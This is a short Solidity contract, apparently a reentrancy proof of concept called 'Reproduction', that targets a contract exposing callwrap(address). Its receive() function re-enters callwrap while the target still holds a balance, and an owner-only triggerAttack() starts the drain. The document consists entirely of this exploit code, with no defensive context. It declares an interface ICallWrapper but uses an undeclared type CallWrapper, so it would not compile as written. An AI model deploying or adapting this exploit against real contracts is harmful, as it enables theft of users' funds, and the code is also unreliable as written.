interface ICallWrapper {
    function callwrap(address called) external;
}

contract Reproduction {
    CallWrapper public target;
    address public owner;

    constructor(address _target) {
        target = CallWrapper(_target);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.callwrap(address(this));
        }
    }

    function triggerAttack() external {
        require(msg.sender == owner, "Not authorized");
        target.callwrap(address(this));
    }
}